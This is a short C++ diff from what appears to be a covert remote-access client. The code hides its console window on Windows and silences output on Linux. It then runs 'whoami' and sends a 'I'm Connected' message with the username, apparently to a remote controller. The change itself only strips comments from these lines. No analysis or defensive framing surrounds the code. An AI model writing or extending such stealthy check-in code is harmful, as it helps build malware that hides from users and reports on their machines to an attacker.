@@ -57,7 +57,6 @@ public:
         HWND hwnd = GetConsoleWindow();
         ShowWindow(hwnd, SW_HIDE);
 #else
-        // Linux: Redirect stdout and stderr to /dev/null
         int devNull = open("/dev/null", O_RDWR);
         dup2(devNull, STDOUT_FILENO);
         dup2(devNull, STDERR_FILENO);
@@ -91,7 +90,7 @@ public:
 #endif
 
     void run() {
-        hideShell(); // Hide the shell at the start
+        hideShell();
 
         std::string username = boost::process::system("whoami");
         sendMessage("I'm Connected | Username : " + username);
